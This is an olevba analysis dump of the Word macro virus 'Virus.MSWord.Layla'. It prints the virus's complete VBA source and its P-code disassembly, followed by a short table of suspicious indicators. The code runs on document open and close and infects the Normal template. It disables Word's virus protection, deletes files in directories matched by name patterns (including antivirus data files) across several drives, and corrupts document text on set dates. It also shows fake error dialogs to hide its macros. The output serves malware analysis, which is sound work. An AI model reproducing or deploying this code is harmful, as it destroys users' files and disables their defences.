olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Layla
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Layla - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TJ.bas 
in file: Virus.MSWord.Layla - OLE stream: 'Macros/VBA/TJ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
           Name:="NewMacros", Object:=wdOrganizerObjectProjectItems

On Error Resume Next
 Call LAYLA
If (Format(Now, "ss") = 27) Or (Format(Now, "ss") = 29) _
Then GoTo DEMO _
Else GoTo FINISH
DEMO:
Dim Chars, CharsNum
Chars = ActiveDocument.Range.ComputeStatistics(Statistic:=wdStatisticCharacters)
CharsNum = 0
Selection.Find.ClearFormatting
 With Selection.Find
   .Text = "^?"
   .Replacement.Text = " "
   .Forward = True
   .Wrap = wdFindContinue
   .Format = False
   .MatchCase = False
   .MatchWholeWord = False
   .MatchWildcards = False
   .MatchSoundsLike = False
   .MatchAllWordForms = False
 End With
For CharsNum = 29 To Chars
Selection.Find.Execute
If (CharsNum Mod 9) = 0 Then Selection.InsertSymbol Font:="Wingdings", CharacterNumber:=-4002, Unicode:=True
Next CharsNum

If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close

FINISH:
End Sub
Sub LAYLA()
'Tj presents... Hi from Samara !
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
With Application
     .UserName = ""
     .UserInitials = "TJ_LAYLA"
     .UserAddress = ""
End With
ActiveDocument.ReadOnlyRecommended = False
KTO_ = 0
If MacroContainer = NormalTemplate Then KTO_ = 1
If KTO_ = 1 Then KTO = NormalTemplate.FullName Else KTO = ActiveDocument.FullName
If KTO_ = 1 Then KOGO = ActiveDocument.FullName Else KOGO = NormalTemplate.FullName
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="TJ", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="TJFrm", Object:=wdOrganizerObjectProjectItems
If KTO_ = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If KTO_ = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub
Sub AutoExec()
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
If Day(Now()) = 29 Or Day(Now()) = 27 Then StatusBar = "Excellent day... for me... :)"
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
On Error Resume Next
With Application
     .UserName = ""
     .UserInitials = "TJ_LAYLA"
     .UserAddress = ""
End With
End Sub
Sub AutoExit()
Application.StatusBar = "Saving..."
Path = "c:\"
Search:
DirName = Dir(Path, vbDirectory)
Do While DirName <> ""
    If DirName <> "." And DirName <> ".." Then
        If (GetAttr(Path & DirName) And vbDirectory) = vbDirectory _
        Then
          With Application.FileSearch
               .FileName = "*d*r*w*.*"
               .LookIn = Path & DirName
               .Execute
          For I = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.*"
           Next I
          End With
          With Application.FileSearch
               .FileName = "*a*v*p*.*"
               .LookIn = Path & DirName
               .Execute
          For I = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.avc"
           On Error Resume Next
           Kill Path & DirName & "\*.key"
           Next I
          End With
        End If
    End If
    DirName = Dir
Loop

Select Case Path
Case "c:\"
    Path = "c:\program files\"
    GoTo Search
Case "c:\program files\"
    Path = "d:\"
    GoTo Search
Case "d:\"
    Path = "e:\"
    GoTo Search
Case "e:\"
    GoTo Konets
End Select

Konets:
End Sub
Sub AutoClose()
On Error Resume Next
 Call FileClose
End Sub
Sub FileClose()
Dim Aries
GoTo Life

Death:
If Day(Now()) = 29 Then Aries = "Tj" Else Aries = "Layla"
StatusBar = "Ńîőđŕíĺíčĺ ôŕéëŕ..."

Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
 With Selection.Find
  .Text = "^#"
  .Replacement.Text = Aries
  .Forward = True
  .Wrap = wdFindContinue
  .Format = False
  .MatchCase = False
  .MatchWholeWord = False
  .MatchWildcards = False
  .MatchSoundsLike = False
  .MatchAllWordForms = False
 End With
 Selection.Find.Execute Replace:=wdReplaceAll
GoTo Yes
Life:
 On Error Resume Next
 Call LAYLA
 If Day(Now()) = 29 Or Day(Now()) = 27 Then GoTo Death
Yes:
 If ActiveDocument.Saved = False Then ActiveDocument.Save
 ActiveDocument.Close
End Sub
Sub ToolsMacro()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub ToolsCustomize()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub FileTemplates()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VB2903.DLL", 16, "Word Basic Error")
End Sub
Sub ViewVBCode()
    Dim MB
    On Error Resume Next
    MB = MsgBox("The program has executed invalid operation and will be closed", 16, "FATAL ERROR")
    Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Layla
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/TJ - 9253 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #4:
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall (Call) LAYLA 0x0000 
' Line #7:
' 	LineCont 0x0008 16 00 00 00 19 00 00 00
' 	Ld Now 
' 	LitStr 0x0002 "ss"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x001B 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	LitStr 0x0002 "ss"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x001D 
' 	Eq 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo DEMO 
' 	Else 
' 	BoSImplicit 
' 	GoTo FINISH 
' 	EndIf 
' Line #8:
' 	Label DEMO 
' Line #9:
' 	Dim 
' 	VarDefn Chars
' 	VarDefn CharsNum
' Line #10:
' 	Ld wdStatisticCharacters 
' 	ParamNamed Statistic 
' 	Ld ActiveDocument 
' 	MemLd Range 
' 	ArgsMemLd ComputeStatistics 0x0001 
' 	St Chars 
' Line #11:
' 	LitDI2 0x0000 
' 	St CharsNum 
' Line #12:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #13:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #14:
' 	LitStr 0x0002 "^?"
' 	MemStWith Then 
' Line #15:
' 	LitStr 0x0001 " "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #16:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #17:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #23:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #24:
' 	EndWith 
' Line #25:
' 	StartForVariable 
' 	Ld CharsNum 
' 	EndForVariable 
' 	LitDI2 0x001D 
' 	Ld Chars 
' 	For 
' Line #26:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #27:
' 	Ld CharsNum 
' 	LitDI2 0x0009 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "Wingdings"
' 	ParamNamed Font 
' 	LitDI2 0x0FA2 
' 	UMi 
' 	ParamNamed CharacterNumber 
' 	LitVarSpecial (True)
' 	ParamNamed Unicode 
' 	Ld Selection 
' 	ArgsMemCall InsertSymbol 0x0003 
' 	EndIf 
' Line #28:
' 	StartForVariable 
' 	Ld CharsNum 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #31:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #32:
' Line #33:
' 	Label FINISH 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub LAYLA())
' Line #36:
' 	QuoteRem 0x0000 0x001F "Tj presents... Hi from Samara !"
' Line #37:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #44:
' 	EndWith 
' Line #45:
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #48:
' 	LitStr 0x0000 ""
' 	MemStWith UserName 
' Line #49:
' 	LitStr 0x0008 "TJ_LAYLA"
' 	MemStWith UserInitials 
' Line #50:
' 	LitStr 0x0000 ""
' 	MemStWith UserAddress 
' Line #51:
' 	EndWith 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #53:
' 	LitDI2 0x0000 
' 	St KTO_ 
' Line #54:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St KTO_ 
' 	EndIf 
' Line #55:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St KTO 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St KTO 
' 	EndIf 
' Line #56:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St KOGO 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St KOGO 
' 	EndIf 
' Line #57:
' 	Ld KTO 
' 	ParamNamed Source 
' 	Ld KOGO 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "TJ"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #58:
' 	Ld KTO 
' 	ParamNamed Source 
' 	Ld KOGO 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "TJFrm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #59:
' 	Ld KTO_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #60:
' 	Ld KTO_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub AutoExec())
' Line #65:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Excellent day... for me... :)"
' 	St StatusBar 
' 	EndIf 
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #71:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #72:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #73:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #74:
' 	EndWith 
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #77:
' 	LitStr 0x0000 ""
' 	MemStWith UserName 
' Line #78:
' 	LitStr 0x0008 "TJ_LAYLA"
' 	MemStWith UserInitials 
' Line #79:
' 	LitStr 0x0000 ""
' 	MemStWith UserAddress 
' Line #80:
' 	EndWith 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub AutoExit())
' Line #83:
' 	LitStr 0x0009 "Saving..."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #84:
' 	LitStr 0x0003 "c:\"
' 	St Path 
' Line #85:
' 	Label Search 
' Line #86:
' 	Ld Path 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St DirName 
' Line #87:
' 	Ld DirName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #88:
' 	Ld DirName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld DirName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	IfBlock 
' Line #89:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #90:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #91:
' 	LitStr 0x0009 "*d*r*w*.*"
' 	MemStWith FileName 
' Line #92:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	MemStWith LookIn 
' Line #93:
' 	ArgsMemCallWith Execute 0x0000 
' Line #94:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #97:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	EndWith 
' Line #99:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #100:
' 	LitStr 0x0009 "*a*v*p*.*"
' 	MemStWith FileName 
' Line #101:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	MemStWith LookIn 
' Line #102:
' 	ArgsMemCallWith Execute 0x0000 
' Line #103:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0006 "\*.avc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	Ld Path 
' 	Ld DirName 
' 	Concat 
' 	LitStr 0x0006 "\*.key"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #108:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	EndWith 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld Dir 
' 	St DirName 
' Line #113:
' 	Loop 
' Line #114:
' Line #115:
' 	Ld Path 
' 	SelectCase 
' Line #116:
' 	LitStr 0x0003 "c:\"
' 	Case 
' 	CaseDone 
' Line #117:
' 	LitStr 0x0011 "c:\program files\"
' 	St Path 
' Line #118:
' 	GoTo Search 
' Line #119:
' 	LitStr 0x0011 "c:\program files\"
' 	Case 
' 	CaseDone 
' Line #120:
' 	LitStr 0x0003 "d:\"
' 	St Path 
' Line #121:
' 	GoTo Search 
' Line #122:
' 	LitStr 0x0003 "d:\"
' 	Case 
' 	CaseDone 
' Line #123:
' 	LitStr 0x0003 "e:\"
' 	St Path 
' Line #124:
' 	GoTo Search 
' Line #125:
' 	LitStr 0x0003 "e:\"
' 	Case 
' 	CaseDone 
' Line #126:
' 	GoTo Konets 
' Line #127:
' 	EndSelect 
' Line #128:
' Line #129:
' 	Label Konets 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoClose())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) FileClose 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub FileClose())
' Line #136:
' 	Dim 
' 	VarDefn Aries
' Line #137:
' 	GoTo Life 
' Line #138:
' Line #139:
' 	Label Death 
' Line #140:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "Tj"
' 	St Aries 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0005 "Layla"
' 	St Aries 
' 	EndIf 
' Line #141:
' 	LitStr 0x0013 "Ńîőđŕíĺíčĺ ôŕéëŕ..."
' 	St StatusBar 
' Line #142:
' Line #143:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #144:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #145:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #146:
' 	LitStr 0x0002 "^#"
' 	MemStWith Then 
' Line #147:
' 	Ld Aries 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #148:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #149:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #151:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #152:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #153:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #154:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #155:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #156:
' 	EndWith 
' Line #157:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #158:
' 	GoTo Yes 
' Line #159:
' 	Label Life 
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	ArgsCall (Call) LAYLA 0x0000 
' Line #162:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo Death 
' 	EndIf 
' Line #163:
' 	Label Yes 
' Line #164:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #165:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub ToolsMacro())
' Line #168:
' 	Dim 
' 	VarDefn MB
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	LitStr 0x0027 "Can't find necessary library VB2903.DLL"
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "Word Basic Error"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub ToolsCustomize())
' Line #173:
' 	Dim 
' 	VarDefn MB
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	LitStr 0x0027 "Can't find necessary library VB2903.DLL"
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "Word Basic Error"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #176:
' 	EndSub 
' Line #177:
' 	FuncDefn (Sub FileTemplates())
' Line #178:
' 	Dim 
' 	VarDefn MB
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	LitStr 0x0027 "Can't find necessary library VB2903.DLL"
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "Word Basic Error"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #181:
' 	EndSub 
' Line #182:
' 	FuncDefn (Sub ViewVBCode())
' Line #183:
' 	Dim 
' 	VarDefn MB
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	LitStr 0x003D "The program has executed invalid operation and will be closed"
' 	LitDI2 0x0010 
' 	LitStr 0x000B "FATAL ERROR"
' 	ArgsLd MsgBox 0x0003 
' 	St MB 
' Line #186:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #187:
' 	EndSub 
' Line #188:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|IOC       |VB2903.DLL          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

